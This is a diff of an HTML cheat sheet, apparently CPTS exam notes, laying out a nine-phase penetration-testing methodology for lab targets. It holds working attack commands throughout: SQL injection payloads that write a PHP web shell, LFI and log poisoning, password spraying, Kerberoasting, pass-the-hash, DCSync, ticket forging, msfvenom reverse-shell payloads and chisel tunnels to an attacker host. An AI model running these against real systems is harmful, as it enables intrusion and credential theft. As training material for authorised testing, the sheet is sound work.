@@ -3,395 +3,553 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Penetration Testing Methodology</title>
+    <title>CPTS Methodology</title>
     <style>
         :root {
             --bg-color: #f4f7f6;
             --text-color: #333;
-            --sidebar-bg: #2c3e50;
+            --sidebar-bg: #1a252f;
             --sidebar-text: #ecf0f1;
             --accent-color: #3498db;
             --code-bg: #282c34;
             --code-text: #abb2bf;
-            --phase1: #3498db;
-            --phase2: #2ecc71;
-            --phase3: #e67e22;
-            --phase4: #9b59b6;
-            --phase5: #e74c3c;
-            --phase6: #1abc9c;
-            --phase7: #f1c40f;
-            --phase8: #d35400;
-            --phase9: #7f8c8d;
+            --phase1: #3498db; /* Prep */
+            --phase2: #2ecc71; /* Network */
+            --phase3: #e67e22; /* Services */
+            --phase4: #9b59b6; /* Web */
+            --phase5: #e74c3c; /* AD */
+            --phase6: #1abc9c; /* Exploit */
+            --phase7: #34495e; /* Post/Pivot */
+            --phase8: #f1c40f; /* PrivEsc */
+            --phase9: #7f8c8d; /* Reporting */
         }
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            line-height: 1.6;
+            line-height: 1.5;
             color: var(--text-color);
             background-color: var(--bg-color);
             margin: 0;
             display: flex;
+            height: 100vh;
         }
 
-        /* Sidebar Navigation */
+        /* Sidebar */
         nav {
-            width: 280px;
+            width: 260px;
             background: var(--sidebar-bg);
             color: var(--sidebar-text);
-            height: 100vh;
-            position: sticky;
-            top: 0;
-            padding: 20px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.2);
+            flex-shrink: 0;
             overflow-y: auto;
-            box-sizing: border-box;
-            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
         }
 
         nav h2 {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #455a64;
-            padding-bottom: 10px;
+            font-size: 1.4rem;
+            margin: 0;
+            padding: 20px;
+            border-bottom: 1px solid #34495e;
             color: var(--accent-color);
+            background: rgba(0,0,0,0.1);
         }
 
         nav ul {
             list-style: none;
             padding: 0;
-        }
-
-        nav ul li {
-            margin-bottom: 10px;
+            margin: 0;
         }
 
         nav ul li a {
             color: var(--sidebar-text);
             text-decoration: none;
-            font-size: 0.9rem;
-            transition: color 0.2s;
+            font-size: 0.95rem;
             display: block;
-            padding: 5px 0;
+            padding: 12px 20px;
+            border-left: 4px solid transparent;
+            transition: all 0.2s;
         }
 
-        nav ul li a:hover {
-            color: var(--accent-color);
+        nav ul li a:hover, nav ul li a.active {
+            background: #2c3e50;
+            border-left-color: var(--accent-color);
         }
+
+        /* Color-code sidebar items */
+        nav ul li:nth-child(1) a:hover { border-left-color: var(--phase1); }
+        nav ul li:nth-child(2) a:hover { border-left-color: var(--phase2); }
+        nav ul li:nth-child(3) a:hover { border-left-color: var(--phase3); }
+        nav ul li:nth-child(4) a:hover { border-left-color: var(--phase4); }
+        nav ul li:nth-child(5) a:hover { border-left-color: var(--phase5); }
+        nav ul li:nth-child(6) a:hover { border-left-color: var(--phase6); }
+        nav ul li:nth-child(7) a:hover { border-left-color: var(--phase7); }
+        nav ul li:nth-child(8) a:hover { border-left-color: var(--phase8); }
+        nav ul li:nth-child(9) a:hover { border-left-color: var(--phase9); }
 
         /* Main Content */
         main {
             flex: 1;
-            padding: 40px;
-            max-width: 1000px;
-            margin: 0 auto;
+            padding: 30px 50px;
+            overflow-y: auto;
+            scroll-behavior: smooth;
         }
 
         .container {
+            max-width: 1100px;
+            margin: 0 auto;
             background: white;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
 
-        h1 {
-            color: var(--sidebar-bg);
-            border-bottom: 3px solid var(--accent-color);
-            padding-bottom: 10px;
-            margin-top: 0;
-        }
-
-        h2 {
-            margin-top: 40px;
+        h1 { margin-top: 0; padding-bottom: 10px; border-bottom: 2px solid #eee; }
+        
+        .section-header {
+            color: white;
             padding: 10px 15px;
             border-radius: 4px;
-            color: white;
-            background: var(--sidebar-bg);
+            margin-top: 40px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
         }
+        
+        .section-header h2 { margin: 0; font-size: 1.5rem; }
+        .section-header .icon { margin-right: 10px; font-size: 1.2rem; }
 
-        /* Phase Specific Colors */
-        #phase-1-preparation-setup { background-color: var(--phase1); }
-        #phase-2-network-enumeration-the-map { background-color: var(--phase2); }
-        #phase-3-service-footprinting-attacks { background-color: var(--phase3); }
-        #phase-4-web-enumeration-the-deep-dive { background-color: var(--phase4); }
-        #phase-5-active-directory-enumeration-attacks { background-color: var(--phase5); }
-        #phase-6-exploitation-shells { background-color: var(--phase6); }
-        #phase-7-post-exploitation-pivoting { background-color: var(--phase7); color: #333; }
-        #phase-8-privilege-escalation { background-color: var(--phase8); }
-        #phase-9-reporting { background-color: var(--phase9); }
+        /* Phase Colors */
+        .ph-1 { background: var(--phase1); }
+        .ph-2 { background: var(--phase2); }
+        .ph-3 { background: var(--phase3); }
+        .ph-4 { background: var(--phase4); }
+        .ph-5 { background: var(--phase5); }
+        .ph-6 { background: var(--phase6); }
+        .ph-7 { background: var(--phase7); }
+        .ph-8 { background: var(--phase8); }
+        .ph-9 { background: var(--phase9); }
 
         h3 {
-            color: var(--sidebar-bg);
-            border-left: 4px solid var(--accent-color);
-            padding-left: 10px;
+            color: #2c3e50;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 5px;
             margin-top: 30px;
         }
 
-        blockquote {
-            background: #eef2f3;
-            border-left: 5px solid var(--accent-color);
-            padding: 15px 20px;
-            margin: 20px 0;
-            font-style: italic;
-        }
-
-        code {
-            background: #f0f0f0;
-            padding: 2px 5px;
-            border-radius: 3px;
-            font-family: 'Fira Code', 'Courier New', monospace;
-            font-size: 0.9em;
-            color: #d63384;
-        }
-
-        pre {
+        .command-block {
             background: var(--code-bg);
             color: var(--code-text);
-            padding: 20px;
+            padding: 15px;
             border-radius: 6px;
-            overflow-x: auto;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin: 10px 0;
             position: relative;
+            overflow-x: auto;
         }
 
-        pre code {
-            background: transparent;
-            color: inherit;
-            padding: 0;
+        .command-block code {
+            display: block;
+            white-space: pre;
+        }
+        
+        .note {
+            background: #e8f4fd;
+            border-left: 4px solid var(--accent-color);
+            padding: 10px 15px;
+            margin: 15px 0;
+            font-size: 0.95rem;
         }
 
-        .sourceCode {
-            margin: 1.5em 0;
+        .warning {
+            background: #fdeded;
+            border-left: 4px solid #e74c3c;
+            padding: 10px 15px;
+            margin: 15px 0;
+            font-size: 0.95rem;
         }
 
-        /* Responsive */
-        @media (max-width: 900px) {
-            body { flex-direction: column; }
-            nav { width: 100%; height: auto; position: relative; }
-            main { padding: 20px; }
-            .container { padding: 20px; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.9rem;
         }
-
-        hr {
-            border: 0;
-            height: 1px;
-            background: #ddd;
-            margin: 40px 0;
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px 12px;
+            text-align: left;
         }
-
-        ul li {
-            margin-bottom: 8px;
+        th { background-color: #f8f9fa; }
+        
+details {
+            margin: 10px 0;
+            background: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 4px;
         }
-
-        strong {
-            color: #2c3e50;
+        details summary {
+            padding: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            color: #555;
         }
+        details[open] summary { border-bottom: 1px solid #eee; }
+        details .content { padding: 15px; }
 
+        /* Syntax Highlighting Sim */
+        .cmd-comment { color: #5c6370; font-style: italic; }
+        .cmd-var { color: #e06c75; }
+        .cmd-flag { color: #d19a66; }
     </style>
 </head>
 <body>
 
 <nav>
-    <h2>Methodology</h2>
+    <h2>CPTS Methodology</h2>
     <ul>
-        <li><a href="#phase-1-preparation-setup">Phase 1: Prep &amp; Setup</a></li>
-        <li><a href="#phase-2-network-enumeration-the-map">Phase 2: Network Enum</a></li>
-        <li><a href="#phase-3-service-footprinting-attacks">Phase 3: Service Attacks</a></li>
-        <li><a href="#phase-4-web-enumeration-the-deep-dive">Phase 4: Web Enum</a></li>
-        <li><a href="#phase-5-active-directory-enumeration-attacks">Phase 5: AD Attacks</a></li>
-        <li><a href="#phase-6-exploitation-shells">Phase 6: Exploitation</a></li>
-        <li><a href="#phase-7-post-exploitation-pivoting">Phase 7: Post-Exploit</a></li>
-        <li><a href="#phase-8-privilege-escalation">Phase 8: PrivEsc</a></li>
-        <li><a href="#phase-9-reporting">Phase 9: Reporting</a></li>
+        <li><a href="#prep">1. Prep &amp; Setup</a></li>
+        <li><a href="#network">2. Network Enum</a></li>
+        <li><a href="#services">3. Service Attacks</a></li>
+        <li><a href="#web">4. Web Attacks</a></li>
+        <li><a href="#ad">5. Active Directory</a></li>
+        <li><a href="#exploitation">6. Exploitation</a></li>
+        <li><a href="#post">7. Post-Exploitation</a></li>
+        <li><a href="#privesc">8. PrivEsc</a></li>
+        <li><a href="#reporting">9. Reporting</a></li>
     </ul>
 </nav>
 
 <main>
     <div class="container">
-        <h1 id="comprehensive-penetration-testing-methodology">Comprehensive Penetration Testing Methodology</h1>
+        <h1>Comprehensive Penetration Testing Methodology</h1>
+        <p class="note"><strong>Goal:</strong> Structured, repeatable, and thorough assessment. "Distinguish between what we see and what we do not see."</p>
+
+        <!-- PHASE 1 -->
+        <div id="prep" class="section-header ph-1">
+            <span class="icon">🛠️</span>
+            <h2>Phase 1: Preparation &amp; Setup</h2>
+        </div>
+        <p>Optimize environment for efficiency and data capture.</p>
         
-        <p>This methodology is a rigorous, step-by-step guide synthesized from the CPTS notes and industry best practices. It allows for a repeatable, structured assessment of target systems, ensuring no stone is left unturned.</p>
+        <h3>1. Workspace &amp; Variables</h3>
+        <div class="command-block">
+            <code>export IP=10.129.x.x
+export URL=http://$IP
+mkdir -p {nmap,scans,exploits,loot,notes,downloads}
+<span class="cmd-comment"># Use tmux/terminator for session management</span></code>
+        </div>
 
-        <blockquote>
-            <p><strong>Core Philosophy:</strong> “Distinguish between what we see and what we do not see. There are always ways to gain more information.”</p>
-        </blockquote>
-
-        <hr />
-
-        <h2 id="phase-1-preparation-setup">Phase 1: Preparation &amp; Setup</h2>
-        <p>Before engaging the target, ensure your environment is optimized for data capture and multitasking.</p>
-
-        <h3 id="workspace-organization">1. Workspace Organization</h3>
+        <h3>2. Mental Model (The Layers)</h3>
         <ul>
-            <li><strong>Directory Structure:</strong>
-                <div class="sourceCode"><pre><code>mkdir -p {target_name}/{nmap,scans,exploits,loot,notes,downloads}
-cd {target_name}</code></pre></div>
-            </li>
-            <li><strong>Session Management:</strong> Use <code>tmux</code> or <code>terminator</code> to manage multiple terminal windows (VPN, Listeners, Scans).</li>
-            <li><strong>Variables:</strong> Export target IP for easy reference: <code>export IP=10.129.x.x</code></li>
+            <li><strong>External:</strong> Domains, ASN, Subdomains.</li>
+            <li><strong>Perimeter:</strong> Firewalls, IDS/IPS, VPN.</li>
+            <li><strong>Services:</strong> Ports, Versions, Tech Stack.</li>
+            <li><strong>Internal:</strong> AD, Trusts, Network Segmentation.</li>
+            <li><strong>Host:</strong> OS, Processes, Filesystem.</li>
         </ul>
 
-        <h3 id="mental-model-the-layers">2. Mental Model (The Layers)</h3>
-        <p>Visualize the target in layers: 
-            <ol>
-                <li><strong>External:</strong> Domains, Subdomains, ASN.</li>
-                <li><strong>Perimeter:</strong> Firewalls, IDS/IPS, VPN endpoints.</li>
-                <li><strong>Services:</strong> Ports, Versions, Applications.</li>
-                <li><strong>Internal:</strong> Active Directory, Trusts, Internal Networks.</li>
-                <li><strong>Host:</strong> OS, Processes, Filesystem, Secrets.</li>
-            </ol>
-        </p>
+        <!-- PHASE 2 -->
+        <div id="network" class="section-header ph-2">
+            <span class="icon">🗺️</span>
+            <h2>Phase 2: Network Enumeration</h2>
+        </div>
+        
+        <h3>1. Host Discovery</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Quick ping sweep</span>
+fping -asgq 10.129.2.0/24
 
-        <hr />
+<span class="cmd-comment"># Nmap ping sweep</span>
+sudo nmap -sn 10.129.2.0/24 -oA scans/discovery</code>
+        </div>
 
-        <h2 id="phase-2-network-enumeration-the-map">Phase 2: Network Enumeration (The Map)</h2>
-        <p>Use <strong>Nmap</strong> to map the attack surface.</p>
+        <h3>2. Port Scanning</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Full TCP Scan (The Standard)</span>
+sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports
 
-        <h3 id="host-discovery">1. Host Discovery</h3>
-        <p>Identify live hosts.</p>
-        <div class="sourceCode"><pre><code># Ping Sweep (Local/VPN)
-sudo nmap -sn 10.129.2.0/24 -oA scans/discovery
+<span class="cmd-comment"># UDP Scan (Crucial for SNMP/TFTP)</span>
+sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan</code>
+        </div>
 
-# FPing (Fast)
-fping -asgq 10.129.2.0/24</code></pre></div>
-
-        <h3 id="port-scanning">2. Port Scanning</h3>
-        <p>Identify open “doors”.</p>
-        <ul>
-            <li><strong>Quick Scan (Top 1000):</strong> <code>sudo nmap $IP --top-ports=1000 --open</code></li>
-            <li><strong>Full TCP Scan (The Standard):</strong>
-                <div class="sourceCode"><pre><code>sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports</code></pre></div>
-            </li>
-            <li><strong>UDP Scan (Don’t Skip):</strong>
-                <div class="sourceCode"><pre><code>sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan</code></pre></div>
-            </li>
-        </ul>
-
-        <h3 id="service-os-detection">3. Service &amp; OS Detection</h3>
-        <p>Fingerprint the services on open ports.</p>
-        <div class="sourceCode"><pre><code># Extract ports from allports.nmap
+        <h3>3. Service &amp; OS Detection</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Targeted scan on open ports</span>
 ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
+sudo nmap -sC -sV -p $ports $IP -oA scans/detailed</code>
+        </div>
 
-# Deep Scan
-sudo nmap -sC -sV -p $ports $IP -oA scans/detailed</code></pre></div>
+        <!-- PHASE 3 -->
+        <div id="services" class="section-header ph-3">
+            <span class="icon">🔍</span>
+            <h2>Phase 3: Service Footprinting</h2>
+        </div>
 
-        <hr />
+        <details>
+            <summary>FTP (21)</summary>
+            <div class="content">
+                <div class="command-block">
+                    <code><span class="cmd-comment"># Anonymous Login</span>
+wget -m --no-passive ftp://anonymous:anonymous@$IP
 
-        <h2 id="phase-3-service-footprinting-attacks">Phase 3: Service Footprinting &amp; Attacks</h2>
-        <p>Deep dive into every open port.</p>
+<span class="cmd-comment"># Brute Force</span>
+hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP</code>
+                </div>
+            </div>
+        </details>
 
-        <h3 id="ftp-21">FTP (21)</h3>
-        <ul>
-            <li><strong>Anonymous Login:</strong> <code>wget -m --no-passive ftp://anonymous:anonymous@$IP</code></li>
-            <li><strong>Brute Force:</strong> <code>hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP</code></li>
-        </ul>
-
-        <h3 id="ssh-22">SSH (22)</h3>
-        <ul>
-            <li><strong>Banner Grabbing:</strong> <code>nc -nv $IP 22</code></li>
-            <li><strong>Key Permissions:</strong> <code>chmod 600 id_rsa</code></li>
-            <li><strong>User Enumeration:</strong> <code>nmap -p22 --script ssh-auth-methods $IP</code></li>
-        </ul>
-
-        <h3 id="smb-139445">SMB (139/445)</h3>
-        <ul>
-            <li><strong>Enumeration:</strong>
-                <div class="sourceCode"><pre><code>smbclient -N -L //$IP
+        <details>
+            <summary>SMB (139/445)</summary>
+            <div class="content">
+                <div class="command-block">
+                    <code><span class="cmd-comment"># Enumeration</span>
+smbclient -N -L //$IP
 smbmap -H $IP
 enum4linux-ng.py $IP -A
-crackmapexec smb $IP --shares -u '' -p ''</code></pre></div>
-            </li>
-        </ul>
 
-        <h3 id="databases">Databases</h3>
-        <ul>
-            <li><strong>MySQL (3306):</strong> <code>mysql -u root -p -h $IP</code></li>
-            <li><strong>MSSQL (1433):</strong>
-                <div class="sourceCode"><pre><code>impacket-mssqlclient User:Pass@$IP -windows-auth
-# Check for xp_cmdshell
+<span class="cmd-comment"># CrackMapExec (Check Null/Guest)</span>
+crackmapexec smb $IP -u '' -p '' --shares
+crackmapexec smb $IP -u 'guest' -p '' --shares
+
+<span class="cmd-comment"># RID Cycling (Find Users)</span>
+crackmapexec smb $IP -u 'guest' -p '' --rid-brute</code>
+                </div>
+            </div>
+        </details>
+
+        <details>
+            <summary>NFS (111/2049)</summary>
+            <div class="content">
+                <div class="command-block">
+                    <code>showmount -e $IP
+mkdir mnt
+sudo mount -t nfs $IP:/share ./mnt -o nolock
+<span class="cmd-comment"># Check for Root Squashing (upload SUID binary)</span></code>
+                </div>
+            </div>
+        </details>
+
+        <details>
+            <summary>DNS (53)</summary>
+            <div class="content">
+                <div class="command-block">
+                    <code><span class="cmd-comment"># Zone Transfer</span>
+dig axfr domain.htb @$IP
+host -l domain.htb $IP
+
+<span class="cmd-comment"># Enum</span>
+dnsenum --enum domain.htb -f subdomains.txt</code>
+                </div>
+            </div>
+        </details>
+
+        <details>
+            <summary>Databases (SQL)</summary>
+            <div class="content">
+                <div class="command-block">
+                    <code><span class="cmd-comment"># MySQL</span>
+mysql -u root -p -h $IP <span class="cmd-comment"># Try empty pass</span>
+
+<span class="cmd-comment"># MSSQL (Impacket)</span>
+impacket-mssqlclient User:Pass@$IP -windows-auth
 SQL&gt; enable_xp_cmdshell
-SQL&gt; xp_cmdshell whoami</code></pre></div>
-            </li>
-        </ul>
+SQL&gt; xp_cmdshell whoami</code>
+                </div>
+            </div>
+        </details>
 
-        <hr />
+        <!-- PHASE 4 -->
+        <div id="web" class="section-header ph-4">
+            <span class="icon">🌐</span>
+            <h2>Phase 4: Web Enumeration &amp; Attacks</h2>
+        </div>
 
-        <h2 id="phase-4-web-enumeration-the-deep-dive">Phase 4: Web Enumeration (The Deep Dive)</h2>
-        <p>If HTTP/HTTPS is present, it is often the primary vector.</p>
+        <h3>1. Reconnaissance</h3>
+        <div class="command-block">
+            <code>whatweb $IP
+curl -I http://$IP
+<span class="cmd-comment"># Tech stack? CMS? Headers?</span></code>
+        </div>
 
-        <h3 id="reconnaissance">1. Reconnaissance</h3>
-        <ul>
-            <li><strong>Tech Stack:</strong> <code>whatweb $IP</code></li>
-            <li><strong>Headers:</strong> <code>curl -I http://$IP</code></li>
-        </ul>
-
-        <h3 id="vhost-subdomain-discovery">2. VHost &amp; Subdomain Discovery</h3>
-        <div class="sourceCode"><pre><code># VHost Fuzzing
+        <h3>2. Fuzzing (VHost &amp; Directory)</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># VHosts (CRITICAL)</span>
 ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w subdomains.txt -fs [size]
 
-# Directory Fuzzing
-ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html</code></pre></div>
+<span class="cmd-comment"># Directories</span>
+ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html,.js</code>
+        </div>
 
-        <hr />
+        <h3>3. Specific Attacks</h3>
+        <details>
+            <summary>SQL Injection</summary>
+            <div class="content">
+                <ul>
+                    <li><strong>Auth Bypass:</strong> <code>admin' or '1'='1</code>, <code>admin')-- -</code></li>
+                    <li><strong>Union:</strong> <code>' UNION SELECT 1,2,3,4-- -</code></li>
+                    <li><strong>File Read:</strong> <code>' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3-- -</code></li>
+                    <li><strong>File Write:</strong> <code>' UNION SELECT "&lt;?php system(\"
+$_GET[\'cmd\']\");?&gt;" INTO OUTFILE '/var/www/html/shell.php'-- -</code></li>
+                </ul>
+            </div>
+        </details>
 
-        <h2 id="phase-5-active-directory-enumeration-attacks">Phase 5: Active Directory Enumeration &amp; Attacks</h2>
-        <p>If connected to a domain environment.</p>
+        <details>
+            <summary>LFI / RCE</summary>
+            <div class="content">
+                <ul>
+                    <li><strong>Basic:</strong> <code>?page=../../../../etc/passwd</code></li>
+                    <li><strong>Wrappers:</strong> <code>php://filter/convert.base64-encode/resource=index.php</code></li>
+                    <li><strong>Log Poisoning:</strong> Inject PHP code into User-Agent, access <code>/var/log/apache2/access.log</code> via LFI.</li>
+                </ul>
+            </div>
+        </details>
 
-        <h3 id="initial-enumeration-no-creds">1. Initial Enumeration (No Creds)</h3>
-        <ul>
-            <li><strong>Responder:</strong> <code>sudo responder -I tun0 -dwv</code></li>
-            <li><strong>Kerbrute:</strong> <code>kerbrute userenum -d domain.local --dc $IP users.txt</code></li>
-        </ul>
+        <!-- PHASE 5 -->
+        <div id="ad" class="section-header ph-5">
+            <span class="icon">🏢</span>
+            <h2>Phase 5: Active Directory</h2>
+        </div>
 
-        <h3 id="credentialed-enumeration">2. Credentialed Enumeration</h3>
-        <ul>
-            <li><strong>Bloodhound:</strong> <code>bloodhound-python -u 'user' -p 'pass' -ns $IP -d domain.local -c all</code></li>
-            <li><strong>SecretsDump:</strong> <code>impacket-secretsdump domain/user:pass@$IP</code></li>
-        </ul>
+        <h3>1. No Credentials</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Poisoning</span>
+sudo responder -I tun0 -dwv
 
-        <hr />
+<span class="cmd-comment"># User Enum</span>
+kerbrute userenum -d domain.local --dc $IP users.txt
 
-        <h2 id="phase-6-exploitation-shells">Phase 6: Exploitation &amp; Shells</h2>
-        
-        <h3 id="payload-crafting-msfvenom">1. Payload Crafting (MSFVenom)</h3>
-        <div class="sourceCode"><pre><code># Windows Reverse Shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe</code></pre></div>
+<span class="cmd-comment"># AS-REP Roasting (No-Auth)</span>
+impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat -outputfile asrep.hashes</code>
+        </div>
 
-        <h3 id="shell-stabilization-linux">2. Shell Stabilization (Linux)</h3>
-        <div class="sourceCode"><pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl+Z
+        <h3>2. With User Credentials</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Bloodhound (The Map)</span>
+bloodhound-python -u 'user' -p 'pass' -ns $IP -d domain.local -c all
+
+<span class="cmd-comment"># Password Spraying</span>
+crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success
+
+<span class="cmd-comment"># Kerberoasting</span>
+impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request
+
+<span class="cmd-comment"># Enumeration</span>
+rpcclient -U "user%pass" $IP
+ldapsearch -x -H ldap://$IP -D "user@domain" -w "pass" -b "DC=domain,DC=local"</code>
+        </div>
+
+        <h3>3. Attacks &amp; Lateral Movement</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Pass-the-Hash</span>
+impacket-psexec domain/user@$IP -hashes :nthash
+evil-winrm -i $IP -u user -H nthash
+
+<span class="cmd-comment"># DCSync (Domain Admin)</span>
+impacket-secretsdump domain/user:pass@$IP
+
+<span class="cmd-comment"># Silver/Golden Tickets</span>
+impacket-ticketer -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain domain.local administrator</code>
+        </div>
+
+        <!-- PHASE 6 -->
+        <div id="exploitation" class="section-header ph-6">
+            <span class="icon">💣</span>
+            <h2>Phase 6: Exploitation</h2>
+        </div>
+
+        <h3>Payloads (MSFVenom)</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Windows</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o shell.exe
+<span class="cmd-comment"># Linux</span>
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o shell.elf
+<span class="cmd-comment"># Web</span>
+msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw &gt; shell.php</code>
+        </div>
+
+        <h3>Shell Stabilization</h3>
+        <div class="command-block">
+            <code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="cmd-comment"># Ctrl+Z</span>
 stty raw -echo; fg
-export TERM=xterm</code></pre></div>
+export TERM=xterm</code>
+        </div>
 
-        <hr />
+        <!-- PHASE 7 -->
+        <div id="post" class="section-header ph-7">
+            <span class="icon">🚇</span>
+            <h2>Phase 7: Post-Exploitation &amp; Pivoting</h2>
+        </div>
 
-        <h2 id="phase-7-post-exploitation-pivoting">Phase 7: Post-Exploitation &amp; Pivoting</h2>
-        <h3 id="pivoting-the-tunnels">1. Pivoting</h3>
+        <h3>Pivoting Tools</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># SSH Dynamic (SOCKS)</span>
+ssh -D 9050 user@pivot
+
+<span class="cmd-comment"># Chisel (Reverse SOCKS)</span>
+(Attacker) ./chisel server -p 8000 --reverse
+(Victim)   ./chisel client $ATTACKER:8000 R:socks
+
+<span class="cmd-comment"># Sshuttle (VPN-like)</span>
+sshuttle -r user@pivot 172.16.x.x/24</code>
+        </div>
+
+        <h3>File Transfers</h3>
+        <div class="command-block">
+            <code><span class="cmd-comment"># Windows</span>
+iwr -uri http://$IP/file.exe -OutFile file.exe
+certutil -urlcache -split -f http://$IP/file.exe
+
+<span class="cmd-comment"># Linux</span>
+wget http://$IP/file
+curl http://$IP/file -o file</code>
+        </div>
+
+        <!-- PHASE 8 -->
+        <div id="privesc" class="section-header ph-8">
+            <span class="icon">⬆️</span>
+            <h2>Phase 8: Privilege Escalation</h2>
+        </div>
+
+        <div style="display: flex; gap: 20px;">
+            <div style="flex: 1;">
+                <h3>Linux</h3>
+                <ul>
+                    <li><code>sudo -l</code></li>
+                    <li><code>find / -perm -4000 2&gt;/dev/null</code> (SUID)</li>
+                    <li><code>getcap -r / 2&gt;/dev/null</code></li>
+                    <li><code>ps -aux | grep root</code></li>
+                    <li><code>cat /etc/crontab</code></li>
+                    <li><strong>Tool:</strong> <code>linpeas.sh</code></li>
+                </ul>
+            </div>
+            <div style="flex: 1;">
+                <h3>Windows</h3>
+                <ul>
+                    <li><code>whoami /priv</code> (SeImpersonate?)</li>
+                    <li><code>whoami /groups</code></li>
+                    <li><code>cmdkey /list</code> (Saved creds?)</li>
+                    <li><code>wmic service get name,pathname,startmode</code></li>
+                    <li><strong>Tool:</strong> <code>winPEASx64.exe</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- PHASE 9 -->
+        <div id="reporting" class="section-header ph-9">
+            <span class="icon">📝</span>
+            <h2>Phase 9: Reporting</h2>
+        </div>
         <ul>
-            <li><strong>SSH SOCKS:</strong> <code>ssh -D 9050 user@pivot</code></li>
-            <li><strong>Chisel:</strong> <code>./chisel client $LHOST:8000 R:socks</code></li>
+            <li><strong>Evidence:</strong> Screenshot every flag and critical step.</li>
+            <li><strong>Cleanup:</strong> Remove all tools, shells, and user accounts created.</li>
+            <li><strong>Note:</strong> Keep raw logs of scans for appendix.</li>
         </ul>
 
-        <hr />
-
-        <h2 id="phase-8-privilege-escalation">Phase 8: Privilege Escalation</h2>
-        <h3 id="linux-privesc">1. Linux PrivEsc</h3>
-        <ul>
-            <li><strong>Sudo:</strong> <code>sudo -l</code></li>
-            <li><strong>SUID:</strong> <code>find / -perm -4000 2&gt;/dev/null</code></li>
-            <li><strong>Automated:</strong> <code>linpeas.sh</code></li>
-        </ul>
-
-        <h3 id="windows-privesc">2. Windows PrivEsc</h3>
-        <ul>
-            <li><strong>Privs:</strong> <code>whoami /priv</code></li>
-            <li><strong>Automated:</strong> <code>winPEASx64.exe</code></li>
-        </ul>
-
-        <hr />
-
-        <h2 id="phase-9-reporting">Phase 9: Reporting</h2>
-        <ul>
-            <li><strong>Documentation:</strong> Screenshot every flag immediately.</li>
-            <li><strong>Cleanup:</strong> Remove all uploaded tools and shells.</li>
-        </ul>
     </div>
 </main>
 
